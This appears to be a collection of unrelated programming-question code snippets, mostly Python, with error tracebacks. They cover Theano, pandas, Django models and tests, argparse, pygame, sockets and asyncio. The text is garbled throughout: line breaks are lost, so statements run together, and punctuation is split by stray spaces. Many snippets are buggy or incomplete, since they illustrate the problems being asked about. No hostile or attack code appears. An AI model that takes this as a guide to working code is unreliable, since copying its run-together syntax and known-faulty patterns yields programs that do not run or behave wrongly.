"import numpy as npimport theanoimport theano.tensor as Tdef addf ( a1 , a2 ) : print ( a1 ) print ( a2 ) return a1+a2i = T.iscalar ( ' i ' ) x0 = T.ivector ( 'x0 ' ) step= T.iscalar ( 'step ' ) results , updates = theano.scan ( fn=addf , outputs_info= [ dict ( initial=x0 , taps= [ -3 ] ) ] , non_sequences=step , n_steps=i ) f=theano.function ( [ x0 , step , i ] , results ) input = [ 2 , 3 ] print ( f ( input , 2 , 20 ) ) [ [ 4 5 ] [ 6 7 ] [ 8 9 ] [ 10 11 ] [ 12 13 ] [ 14 15 ] [ 16 17 ] [ 18 19 ] [ 20 21 ] [ 22 23 ] [ 24 25 ] [ 26 27 ] [ 28 29 ] [ 30 31 ] [ 32 33 ] [ 34 35 ] [ 36 37 ] [ 38 39 ] [ 40 41 ] [ 42 43 ] ] [ 5 2 6 7 4 8 9 6 10 11 8 12 13 10 14 15 12 16 17 ] x0 [ t-3 ]"
def f1 ( ) : f1 ( ) def f2 ( ) : try : f2 ( ) # This line throws an error finally : # except works too f2 ( ) # This line does not throw an error !
"class Example ( Base ) : id = Column ( ... ) some_var = Column ( ... ) from .models import Exampledef get_example_by_id ( id , session ) : return session.query ( Example ) .filter_by ( id=id ) .one ( ) def upsert_example ( id=None , some_var=None , session ) : if id is not None : try : example_obj = get_example_by_id ( id , session ) example_obj.some_var = some_var return except : pass example_obj = Example ( some_var=some_var ) session.add ( example_obj ) session.flush ( ) from db import controllerclass Example ( object ) : def __init__ ( self , id ) : self._id = id self._some_var = None try : self._load_from_db ( ) self._defined = True except : self._defined = False def _load_from_db ( self , session ) : db_obj = controller.get_example_by_id ( self._id , session ) self._some_var = db_obj.some_var def create ( some_var , session ) : if self._defined is True : raise Exception self._some_var = some_var self._sync_to_db ( session ) def _sync_to_db ( self , session ) : controller.upsert_example ( self._some_var , session ) @ property def some_var ( self ) : return self._some_var ..."
"class MyTuple ( tuple ) : def __init__ ( self , *args ) : super ( MyTuple , self ) .__init__ ( *args ) mytuple = MyTuple ( [ 1,2,3 ] ) Traceback ( most recent call last ) : File `` tmp.py '' , line 5 , in < module > mytuple = MyTuple ( [ 1,2,3 ] ) File `` tmp.py '' , line 3 , in __init__ super ( MyTuple , self ) .__init__ ( *args ) TypeError : object.__init__ ( ) takes no parameters"
"using PyCall , DataFrames @ pyimport quandldata = quandl.get ( `` WIKI/AAPL '' , returns = `` pandas '' ) ;"
"arr2 = np.argsort ( np.argsort ( arr1 , axis=0 ) , axis=0 ) / float ( len ( arr1 ) ) * 100 # This is basically to calculate Percentile rank of each value wrt the entire column arr2 = np.argsort ( np.argsort ( arr1 , axis=0 ) , axis=0 ) / float ( len ( arr1 ) ) * 100 arr2 = np.argsort ( np.argsort ( arr1 , axis=0 ) , axis=0 ) / float ( len ( arr1 ) ) * 100 arr2 [ : ] = np.argsort ( np.argsort ( arr1 , axis=0 ) , axis=0 ) / float ( len ( arr1 ) ) * 100"
"df = DataFrame ( { ' B ' : [ 0 , 1 , 2 , np.nan , 4 ] } ) df B0 0.01 1.02 2.03 NaN4 4.0df.expanding ( 2 ) .sum ( ) B0 NaN # 0 + NaN1 1.0 # 1 + 02 3.0 # 2 + 13 3.0 # ? ? 4 7.0 # ? ? df.rolling ( 2 ) .sum ( ) B0 NaN # 0 + NaN1 1.0 # 1 + 02 3.0 # 2 + 13 NaN # NaN + 24 NaN # 4 + NaN"
"Nov 15 , 2017 3:40:23 PM org.apache.pdfbox.pdmodel.font.PDSimpleFont toUnicodeWARNING : No Unicode mapping for .notdef ( 9 ) in font Helvetica"
"import numpy as np import matplotlib.pyplot as pltimport scipy.ndimageplt.style.use ( 'ggplot ' ) def convolve1d ( signal , ir ) : `` '' '' we use the 'same ' / 'constant ' method for zero padding. `` '' '' n = len ( signal ) m = len ( ir ) output = np.zeros ( n ) for i in range ( n ) : for j in range ( m ) : if i - j < 0 : continue output [ i ] += signal [ i - j ] * ir [ j ] return outputdef make_square_and_saw_waves ( height , start , end , n ) : single_square_wave = [ ] single_saw_wave = [ ] for i in range ( n ) : if start < = i < end : single_square_wave.append ( height ) single_saw_wave.append ( height * ( end-i ) / ( end-start ) ) else : single_square_wave.append ( 0 ) single_saw_wave.append ( 0 ) return single_square_wave , single_saw_wave # create signal and IRstart = 40end = 60single_square_wave , single_saw_wave = make_square_and_saw_waves ( height=10 , start=start , end=end , n=100 ) # convolve , compare different methodsnp_conv = np.convolve ( single_square_wave , single_saw_wave , mode='same ' ) convolution1d = convolve1d ( single_square_wave , single_saw_wave ) sconv = scipy.ndimage.convolve1d ( single_square_wave , single_saw_wave , mode='constant ' ) # plot them , scaling by the heightplt.clf ( ) fig , axs = plt.subplots ( 5 , 1 , figsize= ( 12 , 6 ) , sharey=True , sharex=True ) axs [ 0 ] .plot ( single_square_wave / np.max ( single_square_wave ) , c= ' r ' ) axs [ 0 ] .set_title ( 'Single Square ' ) axs [ 0 ] .set_ylim ( -.1 , 1.1 ) axs [ 1 ] .plot ( single_saw_wave / np.max ( single_saw_wave ) , c= ' b ' ) axs [ 1 ] .set_title ( 'Single Saw ' ) axs [ 2 ] .set_ylim ( -.1 , 1.1 ) axs [ 2 ] .plot ( convolution1d / np.max ( convolution1d ) , c= ' g ' ) axs [ 2 ] .set_title ( 'Our Convolution ' ) axs [ 2 ] .set_ylim ( -.1 , 1.1 ) axs [ 3 ] .plot ( np_conv / np.max ( np_conv ) , c= ' g ' ) axs [ 3 ] .set_title ( 'Numpy Convolution ' ) axs [ 3 ] .set_ylim ( -.1 , 1.1 ) axs [ 4 ] .plot ( sconv / np.max ( sconv ) , c='purple ' ) axs [ 4 ] .set_title ( 'Scipy Convolution ' ) axs [ 4 ] .set_ylim ( -.1 , 1.1 ) plt.show ( )"
"[ 7,10,13,10 ] import numpy as np import random from random import uniform as rand total=50 n=10 low=2 high=15 result= [ ] m=0 nobs=1 while nobs < = n : if m > = ( total - low ) : last_num= total -new_tot result.append ( last_num ) else : next_num=np.random.randint ( low , high,1 ) new_tot = sum ( result ) + next_num result.append ( next_num ) m=new_tot nobs +=1 print result print sum ( result )"
"parser.add_argument ( ' -- animal ' , choices= [ 'raccoon ' , 'giraffe ' , 'snake ' ] , default='raccoon ' , ) parser.add_argument ( ' -- with-shoes ' , action='store_true ' , ) my_script.py -- animal snake -- with-shoes my_script.py -- animal raccoon -- with-shoesmy_script.py -- animal raccoonmy_script.py -- animal snakemy_script.py -- animal giraffe -- with-shoesmy_script.py -- animal giraffe"
python code.py < input.txt > output.txt
class A ( object ) : passclass B ( A ) : pass def do_something ( klass ) : `` '' '' : type klass : WHAT_HERE `` '' '' pass : type klass : A
"datetime.strptime ( `` % B % d , % Y '' , `` January 8 , 2014 '' ) datetime.strptime ( `` January 8 , 2014 '' , `` % B % d , % Y '' ) > > > datetime.strptime ( `` % B % d , % Y '' , `` January 8 , 2014 '' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/_strptime.py '' , line 325 , in _strptime ( data_string , format ) ) ValueError : time data ' % B % d , % Y ' does not match format 'January 8 , 2014 '"
python setup.py install
"import pygame , sys , osfrom pygame.locals import *pygame.mixer.pre_init ( 44100 , -16 , 4 , 2048 ) pygame.init ( ) DISPLAYSURF = pygame.display.set_mode ( ( 476 , 506 ) , FULLSCREEN ) pygame.display.set_caption ( 'Title of the game ' ) DISPLAYSURF.fill ( ( 128,128,128 ) ) FONT = pygame.font.Font ( 'freesansbold.ttf',20 ) LoadingText = FONT.render ( 'Loading ... ' , True , ( 0,255,0 ) ) LoadingRect = LoadingText.get_rect ( ) LoadingRect.center = ( 238,253 ) DISPLAYSURF.blit ( LoadingText , LoadingRect ) pygame.display.update ( ) # These files will be created when needed . They are now removed to prevent interference later.try : os.remove ( 'LOAD.txt ' ) except IOError : passtry : os.remove ( 'OPEN.txt ' ) except IOError : passtry : os.remove ( 'RUN.txt ' ) except IOError : passtry : os.remove ( 'TEMP.txt ' ) except IOError : pass # All parts of the program are split into small programs that are callable with a main functionimport ROIMimport ROIM_CreateNewGameimport ROIM_LevelMenuimport ROIM_Menuimport ROIM_SmallMenusimport ROIM_GameIntroductionimport SetupController # RUN.txt is a file that says wich program to runRun = 'Menu'RUN = open ( 'RUN.txt ' , ' w ' ) RUN.write ( 'RUN\n ' ) RUN.write ( Run ) RUN.close ( ) ChangeRun = FalseFPS = 35fpsClock = pygame.time.Clock ( ) while True : # MAIN GAME LOOP for event in pygame.event.get ( ) : if event.type == QUIT : pygame.quit ( ) sys.exit ( ) Preferences = open ( 'Preferences.txt ' ) PreferencesLines = Preferences.read ( ) .split ( '\n ' ) x = 1 Volume = -1 Brightness = -1 for Item in PreferencesLines : if Item == 'BRIGHTNESS ' : Brightness = int ( PreferencesLines [ x ] ) if Item == 'VOLUME ' : Volume = int ( PreferencesLines [ x ] ) x += 1 Preferences.close ( ) assert Volume ! = -1 assert Brightness ! = -1 # The colors will be changed to the right brightness . GREEN = ( 0,255 * ( Brightness / 100 ) ,0 ) YELLOW = ( 255 * ( Brightness / 100 ) ,255 * ( Brightness / 100 ) ,0 ) RED = ( 255 * ( Brightness / 100 ) ,0,0 ) BLUE = ( 0,0,255 * ( Brightness / 100 ) ) WHITE = ( 255 * ( Brightness / 100 ) ,255 * ( Brightness / 100 ) ,255 * ( Brightness / 100 ) ) BLACK = ( 0,0,0 ) GREY = ( 128 * ( Brightness / 100 ) ,128 * ( Brightness / 100 ) ,128 * ( Brightness / 100 ) ) # Every small program gets the main variables and constants as arguments if Run == 'Menu ' : ROIM_Menu.RunMenu ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) elif Run == 'NewGame ' : ROIM_CreateNewGame.RunNewGame ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) elif Run == 'Game ' : ROIM.RunGame ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) elif Run == 'SmallMenu ' : ROIM_SmallMenus.RunSmallMenu ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) elif Run == 'LevelMenu ' : ROIM_LevelMenu.RunLevelMenu ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) elif Run == 'Introduction ' : ROIM_GameIntroduction.RunIntro ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) elif Run == 'Setup ' : SetupController.Run_Controller_Setup ( FONT , ChangeRun , GREEN , YELLOW , RED , BLUE , WHITE , BLACK , GREY , DISPLAYSURF , Volume , Brightness , fpsClock , FPS ) else : assert False # Every program edits the RUN file before finishing ChangeRun = False RUN = open ( 'RUN.txt ' ) assert RUN.readline ( ) == 'RUN\n ' Run = RUN.readline ( ) .split ( '\n ' ) [ 0 ] RUN.close ( )"
"a=np.array ( [ [ 1,1,0 ] , [ 1,0,0 ] , [ 1,0,0 ] ] ) array ( [ [ 0,0,1 ] , [ 0,1,1.41 ] , [ 0,1,2 ] ] )"
"class CompressedJSONField ( JSONField , CompressedField ) : pass RuntimeError : maximum recursion depth exceeded while calling a Python object class CustomField ( models.TextField , models.CharField ) : pass from django.db import modelsclass CompressedField ( models.TextField ) : `` '' '' Standard TextField with automatic compression/decompression. `` '' '' __metaclass__ = models.SubfieldBase description = 'Field which compresses stored data . ' def to_python ( self , value ) : return value def get_db_prep_value ( self , value , **kwargs ) : return super ( CompressedField , self ) \ .get_db_prep_value ( value , prepared=True ) class JSONField ( models.TextField ) : `` '' '' JSONField with automatic serialization/deserialization. `` '' '' __metaclass__ = models.SubfieldBase description = 'Field which stores a JSON object ' def to_python ( self , value ) : return value def get_db_prep_save ( self , value , **kwargs ) : return super ( JSONField , self ) .get_db_prep_save ( value , **kwargs ) class CompressedJSONField ( JSONField , CompressedField ) : pass from django.db import modelsfrom customfields import CompressedField , JSONField , CompressedJSONFieldclass TestModel ( models.Model ) : name = models.CharField ( max_length=150 ) compressed_field = CompressedField ( ) json_field = JSONField ( ) compressed_json_field = CompressedJSONField ( ) def __unicode__ ( self ) : return self.name"
"import pytestimport numpy as np @ pytest.fixture ( ) def arr ( ) : np.random.seed ( 141 ) return np.random.seed ( 141 ) @ pytest.fixture ( ) def model ( arr ) : return arr * 2def test_multiplication ( arr , model ) : assert model == arr * 2"
"def reduceOutputListToPossibleMatches ( outputList , detailsList ) : reducedList = list ( ) for outputItem in outputList : isFound = False for detailsItem in detailsList : if detailsItem [ 14 ] == outputItem [ 4 ] : if isfound : detailsItem [ 30 ] = `` 1 '' # ambigous case # - more than one match was found # 1 is an indicator for true - I am not using python here because spss has no support for booleans . isFound = True if isFound : reducedList.append ( detailsItem ) return reducedList"
"> > > my_regex = r ' ( ? P < zip > Zip : \s*\d\d\d\d\d ) \s* ( State : \s*\w\w ) ' > > > addrs = `` Zip : 10010 State : NY '' > > > y = re.search ( my_regex , addrs ) > > > y.groupdict ( 'zip ' ) { 'zip ' : 'Zip : 10010 ' } > > > y.group ( 2 ) 'State : NY '"
"data = { 'fruits ' : [ 'banana ' , 'apple ' , 'pear ' ] , 'source ' : ( [ 'brazil ' , 'algeria ' , 'nigera ' ] , [ 'brazil ' , 'morocco ' , 'iran ' , 'france ' ] , [ 'china ' , 'india ' , 'mexico ' ] ) , 'prices ' : [ 2 , 3 , 7 ] } df = pd.DataFrame ( data , columns = [ 'fruits ' , 'source ' , 'prices ' ] ) [ 'banana ' , 'banana ' , 'banana ' , 'apple ' , 'apple ' , 'apple ' , 'apple ' , 'pear ' , 'pear ' , 'pear ' ] , [ 'brazil ' , 'algeria ' , 'nigera ' , 'brazil ' , 'morocco ' , 'iran ' , 'france ' , 'china ' , 'india ' , 'mexico ' ] , [ ' 2 ' , ' 2 ' , ' 2 ' , ' 3 ' , ' 3 ' , ' 3 ' , ' 3 ' , ' 7 ' , ' 7 ' , ' 7 ' ] ,"
"def decrement ( player_key , value=5 ) : player = Player.get ( player_key ) player.stat -= value player.put ( )"
"from flask_caching import Cache ... cache = Cache ( app , config= { 'CACHE_TYPE ' : 'simple ' } ) class MyEndpoint ( Resource ) : def get ( self ) : do_stuff_here class MyEndpoint ( Resource ) : @ cache.cached ( timeout=600 ) def get ( self ) : do_stuff_here |-app.py| -- api | -__init__.py -views.py"
{ `` python.pythonPath '' : `` C : \\Users\\yatin\\.conda\\envs\\tom\\python.exe '' } # conda environments : # base * C : \ProgramData\Anaconda3tom C : \Users\yatin\.conda\envs\tom # conda environments : # base C : \ProgramData\Anaconda3tom * C : \Users\yatin\.conda\envs\tom import osimport sysos.path.dirname ( sys.executable ) ' C : \\Python38 '
df.rolling ( 2 ) .min ( )
"STATIC_URL = '/static/'STATICFILES_DIRS = ( os.path.join ( BASE_DIR , `` static '' ) , ) STATIC_ROOT = '/var/www/static/ '"
python manage.py migrate [ 1 ] abort python manage.py migrate python manage.py runserver
"class Profile ( models.Model ) : active = models.BooleanField ( ) user = models.ForeignKey ( get_user_model ( ) , on_delete=models.CASCADE , related_name='profiles ' ) department = models.ForeignKey ( Department , null=True , blank=True ) category_at_start = models.ForeignKey ( Category ) role = models.ForeignKey ( Role ) series = models.ForeignKey ( Series , null=True , blank=True ) status = models.ForeignKey ( 'Status ' , Status ) def save ( self , *args , **kwargs ) : super ( Profile , self ) .save ( *args , **kwargs ) active_roles = [ ] active_status = [ ] for profile in Profile.objects.filter ( user=self.user ) : if profile.active : active_roles.append ( profile.role.code ) active_status.append ( profile.status.name ) self.user.current_role = '/'.join ( set ( active_roles ) ) if 'Training ' in active_status : self.user.current_status = 'Training ' elif 'Certified ' in active_status : self.user.current_status = 'Certified ' else : self.user.current_status = '/'.join ( set ( active_status ) ) self.user.save ( ) super ( Profile , self ) .save ( *args , **kwargs ) # # # < -- seems to be the issue . class ProfileFactory ( f.django.DjangoModelFactory ) : class Meta : model = models.Profile active = f.Faker ( 'boolean ' ) user = f.SubFactory ( UserFactory ) department = f.SubFactory ( DepartmentFactory ) category_at_start = f.SubFactory ( CategoryFactory ) role = f.SubFactory ( RoleFactory ) series = f.SubFactory ( SeriesFactory ) status = f.SubFactory ( StatusFactory ) class ProfileTest ( TestCase ) : def test_profile_creation ( self ) : o = factories.ProfileFactory ( ) self.assertTrue ( isinstance ( o , models.Profile ) ) django.db.utils.IntegrityError : UNIQUE constraint failed : simtrack_profile.id"
"lazy val numNonZero = weights.filter { case ( k , w ) = > w > 0 } .keys"
"Server is running ... Degree of parallelism : 4Socket created.Socket bount to : ( `` , 0 ) Process 3604 is alive : TrueProcess 5188 is alive : TrueProcess 6800 is alive : TrueProcess 2844 is alive : TruePress ctrl+c to kill all processes.Process 3604 is alive : FalseProcess 3604 exit code : 1Process 5188 is alive : FalseProcess 5188 exit code : 1Process 6800 is alive : FalseProcess 6800 exit code : 1Process 2844 is alive : FalseProcess 2844 exit code : 1The children died ... Why god ? WHYYyyyyy ! ! ? ! ? ! ? # Importsimport socket import packetimport sysimport osfrom time import sleepimport multiprocessing as mpimport pickleimport io # ConstantsDEGREE_OF_PARALLELISM = 4DEFAULT_HOST = `` '' DEFAULT_PORT = 0def _parse_cmd_line_args ( ) : arguments = sys.argv if len ( arguments ) == 1 : return DEFAULT_HOST , DEFAULT_PORT else : raise NotImplemented ( ) def debug ( data ) : pid = os.getpid ( ) with open ( ' C : \\Users\\Trauer\\Desktop\\debug\\'+str ( pid ) +'.txt ' , mode= ' a ' , encoding='utf8 ' ) as file : file.write ( str ( data ) + '\n ' ) def handle_connection ( client ) : client_data = client.recv ( packet.MAX_PACKET_SIZE_BYTES ) debug ( 'received data from client : ' + str ( len ( client_data ) ) ) response = client_data.upper ( ) client.send ( response ) debug ( 'sent data from client : ' + str ( response ) ) def listen ( picklez ) : debug ( 'started listen function ' ) pid = os.getpid ( ) server_socket = pickle.loads ( picklez ) debug ( 'acquired socket ' ) while True : debug ( 'Sub process { 0 } is waiting for connection ... '.format ( str ( pid ) ) ) client , address = server_socket.accept ( ) debug ( 'Sub process { 0 } accepted connection { 1 } '.format ( str ( pid ) , str ( client ) ) ) handle_connection ( client ) client.close ( ) debug ( 'Sub process { 0 } finished handling connection { 1 } ' . format ( str ( pid ) , str ( client ) ) ) if __name__ == `` __main__ '' : # Since most python interpreters have a GIL , multithreading wo n't cut # it ... Oughta bust out some process , yo ! host_port = _parse_cmd_line_args ( ) print ( 'Server is running ... ' ) print ( 'Degree of parallelism : ' + str ( DEGREE_OF_PARALLELISM ) ) server_socket = socket.socket ( socket.AF_INET , socket.SOCK_STREAM ) print ( 'Socket created . ' ) server_socket.bind ( host_port ) server_socket.listen ( DEGREE_OF_PARALLELISM ) print ( 'Socket bount to : ' + str ( host_port ) ) buffer = io.BytesIO ( ) mp.reduction.ForkingPickler ( buffer ) .dump ( server_socket ) picklez = buffer.getvalue ( ) children = [ ] for i in range ( DEGREE_OF_PARALLELISM ) : child_process = mp.Process ( target=listen , args= ( picklez , ) ) child_process.daemon = True child_process.start ( ) children.append ( child_process ) while not child_process.pid : sleep ( .25 ) print ( 'Process { 0 } is alive : { 1 } '.format ( str ( child_process.pid ) , str ( child_process.is_alive ( ) ) ) ) print ( ) kids_are_alive = True while kids_are_alive : print ( 'Press ctrl+c to kill all processes.\n ' ) sleep ( 1 ) exit_codes = [ ] for child_process in children : print ( 'Process { 0 } is alive : { 1 } '.format ( str ( child_process.pid ) , str ( child_process.is_alive ( ) ) ) ) print ( 'Process { 0 } exit code : { 1 } '.format ( str ( child_process.pid ) , str ( child_process.exitcode ) ) ) exit_codes.append ( child_process.exitcode ) if all ( exit_codes ) : # Why do they die so young ? : ( print ( 'The children died ... ' ) print ( 'Why god ? ' ) print ( 'WHYYyyyyy ! ! ? ! ? ! ? ' ) kids_are_alive = False"
DbfError : unable to modify fields individually except in with or Process ( ) with dbf.Table ( `` aa.dbf '' ) as table : for record in table : record [ 3 ] = 200
"parser = argparse.ArgumentParser ( ) subparsers = parser.add_subparsers ( dest='subparser_name ' ) parser.add_argument ( ' -- disable ' ) # This flag ... sp = subparsers.add_parser ( 'compile ' ) sp.add_argument ( 'zones ' , nargs='* ' ) sp.add_argument ( ' -- disable ' ) # Is repeated ... sp = subparsers.add_parser ( 'launch ' ) sp.add_argument ( 'zones ' , nargs='* ' ) sp.add_argument ( ' -- disable ' ) # over and over ..."
"import pandas as pdfrom itertools import izip_longestd1= { ' a':1 , ' b':2 , ' c':3 , 'd':4 , ' e':5 , ' f':6 } d2= { ' a':1 , ' b':2 , ' c':3 , 'd':4 , ' e':5 , ' f':6 } d3= { ' a':1 , ' b':2 , ' c':3 , 'd':4 , ' e':5 , ' f':6 } dict_list= [ d1 , d2 , d3 ] stats_matrix= [ tuple ( 'dict { } '.format ( i+1 ) for i in range ( len ( dict_list ) ) ) ] + list ( izip_longest ( * ( [ v for k , v in sorted ( d.items ( ) ) ] for d in dict_list ) ) ) stats_matrix.pop ( 0 ) mydf=pd.DataFrame ( stats_matrix , index=None ) mydf.columns = [ 'd1 ' , 'd2 ' , 'd3 ' ] writer = pd.ExcelWriter ( 'myfile.xlsx ' , engine='xlsxwriter ' ) mydf.to_excel ( writer , sheet_name='sole ' ) writer.save ( ) > Sheet1 < d1 d2 d3 1 1 12 2 23 3 34 4 45 5 56 6 6 > Sheet1 < > Sheet2 < > Sheet3 < d1 d2 d3 d1 d2 d3 d1 d2 d3 1 1 1 3 3 3 5 5 52 2 2 4 4 4 6 6 6"
".. automodule : : account.models : members : import osimport syssys.path.insert ( 0 , os.path.abspath ( '../../ ' ) ) from django.conf import settingssettings.configure ( ) import djangodjango.setup ( ) from django.conf import settingssettings.configure ( ) import djangodjango.setup ( )"
"class _vendrRecord ( Structure ) : _pack_ = 1 # pack the struct _fields_ = [ ( `` vendorName '' , c_ubyte * ( 40 + 1 ) ) , ( `` ytdPayments '' , c_ulong ) , ] printf ( b '' % s\n '' , vendrRecord.vendorName )"
http : //example.com/missing-admin-media-prefix/img/icon_calendar.gifhttp : //example.com/missing-admin-media-prefix/img/icon_clock.gif STATIC_URL = '/static/ ' # ADMIN_MEDIA_PREFIX = '/static/admin/ ' # MEDIA_URL = `` /media/ '' # MEDIA_ROOT = `` /home/user/app_root/media/ '' STATIC_ROOT = `` /home/user/app_root/static/ ''
"rv = self.app.get ( '/ ' ) assert 'No entries here so far ' in rv.data app_rv = app ( environ , start_response ) rv = run_wsgi_app ( self.application , environ , buffered=buffered )"
"Time Open High Low Close Volume2007-04-01 21:02:00 1.968 2.389 1.968 2.389 18.3000002007-04-01 21:03:00 157.140 157.140 157.140 157.140 2.400000 In : df [ `` Close '' ] .replace ( 2.389 , np.nan ) Out : 2007-04-01 21:02:00 2.389 2007-04-01 21:03:00 157.140"
"import numpy as npy = [ 1,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,1,1 ] mask = np.ediff1d ( y ) starts = np.where ( mask > 0 ) ends = np.where ( mask < 0 )"
"class MySocket ( socket.socket ) : def __init__ ( self , *args , **kwargs ) : socket.socket.__init__ ( self , *args , **kwargs ) self.queue = queue.Queue ( ) connection , client_address = s.accept ( ) class MySocket ( socket.socket ) : def __init__ ( self , true_socket ) : self.true_socket = true_socket self.queue = queue.Queue ( ) def accept ( self , *args , **kwargs ) : con , cli = socket.socket.accept ( self , *args , **kwargs ) return self.__class__ ( con ) , cli readable , writable , exceptional = select.select ( inputs , outputs , inputs ) s = socket.socket ( ... ) s.queue = queue.Queue ( )"
"import asyncioimport multiprocessingfrom multiprocessing import Queuefrom concurrent.futures.thread import ThreadPoolExecutorimport sysdef main ( ) : executor = ThreadPoolExecutor ( ) loop = asyncio.get_event_loop ( ) # comment the following line and the shutdown will work smoothly asyncio.ensure_future ( print_some ( executor ) ) try : loop.run_forever ( ) except KeyboardInterrupt : print ( `` shutting down '' ) executor.shutdown ( ) loop.stop ( ) loop.close ( ) sys.exit ( ) async def print_some ( executor ) : print ( `` Waiting ... Hit CTRL+C to abort '' ) queue = Queue ( ) loop = asyncio.get_event_loop ( ) some = await loop.run_in_executor ( executor , queue.get ) print ( some ) if __name__ == '__main__ ' : main ( )"
"self.image_sub = rospy.Subscriber ( `` image '' , Image , mask_detect , queue_size=1 , buff_size=2**24 ) depth_image_sub = rospy.Subscriber ( `` depth_image '' , Image , aquire_depth_image , queue_size=1000 ) color_depth = rospy.Subscriber ( [ `` image '' , `` depth_image '' ] , callback_function , mergePolicy= '' EXACTTIME '' )"
"from django.db import modelsfrom django.contrib.auth.models import Userfrom django.db.models.signals import post_savefrom django.dispatch import receiverclass Investment ( models.Model ) : `` '' '' the main model '' '' '' status = models.IntegerField ( ) class InvestmentStatusTrack ( models.Model ) : `` '' '' track every change of status on an investment '' '' '' investment = models.ForeignKey ( Investment , on_delete=models.CASCADE ) status = models.IntegerField ( ) modified_on = models.DateTimeField ( blank=True , null=True , default=None , verbose_name=_ ( 'modified on ' ) , db_index=True ) modified_by = models.ForeignKey ( User , blank=True , null=True , default=None , verbose_name=_ ( 'modified by ' ) , on_delete=models.CASCADE ) class Meta : ordering = ( '-modified_on ' , ) def __str__ ( self ) : return ' { 0 } - { 1 } '.format ( self.investment , self.status ) @ receiver ( post_save , sender=Investment ) def handle_status_track ( sender , instance , created , **kwargs ) : `` '' '' add a new track every time the investment status change '' '' '' request = get_request ( ) # a way to get the current request modified_by = None if request and request.user and request.user.is_authenticated : modified_by = request.user InvestmentStatusTrack.objects.create ( investment=instance , status=instance.status , modified_on=datetime.now ( ) , modified_by=modified_by ) Traceback ( most recent call last ) : File `` /env/lib/python3.6/site-packages/django/test/testcases.py '' , line 209 , in __call__ self._post_teardown ( ) File `` /env/lib/python3.6/site-packages/django/test/testcases.py '' , line 893 , in _post_teardown self._fixture_teardown ( ) File `` /env/lib/python3.6/site-packages/django/test/testcases.py '' , line 1041 , in _fixture_teardown connections [ db_name ] .check_constraints ( ) File `` /env/lib/python3.6/site-packages/django/db/backends/postgresql/base.py '' , line 235 , in check_constraints self.cursor ( ) .execute ( 'SET CONSTRAINTS ALL IMMEDIATE ' ) File `` /env/lib/python3.6/site-packages/django/db/backends/utils.py '' , line 68 , in execute return self._execute_with_wrappers ( sql , params , many=False , executor=self._execute ) File `` /env/lib/python3.6/site-packages/django/db/backends/utils.py '' , line 77 , in _execute_with_wrappers return executor ( sql , params , many , context ) File `` /env/lib/python3.6/site-packages/django/db/backends/utils.py '' , line 85 , in _execute return self.cursor.execute ( sql , params ) File `` /env/lib/python3.6/site-packages/django/db/utils.py '' , line 89 , in __exit__ raise dj_exc_value.with_traceback ( traceback ) from exc_value File `` /env/lib/python3.6/site-packages/django/db/backends/utils.py '' , line 83 , in _execute return self.cursor.execute ( sql ) django.db.utils.IntegrityError : insert or update on table `` investments_investmentstatustrack '' violates foreign key constraint `` investments_investme_modified_by_id_3a12fb21_fk_auth_user '' DETAIL : Key ( modified_by_id ) = ( 1 ) is not present in table `` auth_user '' . class TrackInvestmentStatusTest ( ApiTestCase ) : def login ( self , is_staff=False ) : password = `` abc123 '' self.user = mommy.make ( User , is_staff=is_staff , is_active=True ) self.user.set_password ( password ) self.user.save ( ) self.assertTrue ( self.client.login ( username=self.user.username , password=password ) ) def test_add_investment ( self ) : `` '' '' it should add a new investment and add a track '' '' '' self.login ( ) url = reverse ( 'investments : investments-list ' ) data = { } response = self.client.post ( url , data=data ) self.assertEqual ( response.status_code , status.HTTP_201_CREATED ) self.assertEqual ( 1 , Investment.objects.count ( ) ) investment = Investment.objects.all ( ) [ 0 ] self.assertEqual ( investment.status , Investment.STATUS_IN_PROJECT ) self.assertEqual ( 1 , InvestmentStatusTrack.objects.count ( ) ) track = InvestmentStatusTrack.objects.all ( ) [ 0 ] self.assertEqual ( track.status , investment.status ) self.assertEqual ( track.investment , investment ) self.assertEqual ( track.modified_by , self.user ) self.assertEqual ( track.modified_on.date ( ) , date.today ( ) ) def test_save_status ( self ) : `` '' '' it should modify the investment and add a track '' '' '' self.login ( ) investment_status = Investment.STATUS_IN_PROJECT investment = mommy.make ( Investment , asset=asset , status=investment_status ) investment_id = investment.id self.assertEqual ( 1 , InvestmentStatusTrack.objects.count ( ) ) track = InvestmentStatusTrack.objects.all ( ) [ 0 ] self.assertEqual ( track.status , investment.status ) self.assertEqual ( track.investment , investment ) self.assertEqual ( track.modified_by , None ) self.assertEqual ( track.modified_on.date ( ) , date.today ( ) ) url = reverse ( 'investments : investments-detail ' , args= [ investment.id ] ) data = { 'status ' : Investment.STATUS_ACCEPTED } response = self.client.patch ( url , data=data ) self.assertEqual ( response.status_code , status.HTTP_200_OK ) self.assertEqual ( 1 , Investment.objects.count ( ) ) investment = Investment.objects.all ( ) [ 0 ] self.assertEqual ( investment.id , investment_id ) self.assertEqual ( investment.status , Investment.STATUS_ACCEPTED ) self.assertEqual ( 2 , InvestmentStatusTrack.objects.count ( ) ) track = InvestmentStatusTrack.objects.all ( ) [ 0 ] self.assertEqual ( track.status , Investment.STATUS_ACCEPTED ) self.assertEqual ( track.investment , investment ) self.assertEqual ( track.modified_by , self.user ) self.assertEqual ( track.modified_on.date ( ) , date.today ( ) ) track = InvestmentStatusTrack.objects.all ( ) [ 1 ] self.assertEqual ( track.status , Investment.STATUS_IN_PROJECT ) self.assertEqual ( track.investment , investment ) self.assertEqual ( track.modified_by , None ) self.assertEqual ( track.modified_on.date ( ) , date.today ( ) 